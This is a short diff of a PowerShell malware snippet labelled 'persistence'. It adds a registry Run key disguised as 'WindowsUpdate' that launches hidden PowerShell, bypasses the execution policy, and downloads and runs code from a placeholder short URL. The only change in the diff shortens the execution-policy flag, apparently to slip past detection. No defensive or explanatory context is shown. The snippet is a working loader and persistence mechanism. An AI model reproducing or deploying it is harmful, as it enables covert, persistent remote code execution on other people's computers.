@@ -1,7 +1,7 @@
 # --- 1. PERSISTENCE (Adds to Registry) ---
 $Path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 $Name = "WindowsUpdate"
-$Value = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command IEX(New-Object Net.WebClient).DownloadString('YOUR_SHORT_URL')"
+$Value = "powershell.exe -WindowStyle Hidden -Exec Bypass -Command IEX(New-Object Net.WebClient).DownloadString('YOUR_SHORT_URL')"
 if (!(Get-ItemProperty -Path $Path -Name $Name -ErrorAction SilentlyContinue)) {
     Set-ItemProperty -Path $Path -Name $Name -Value $Value
 }
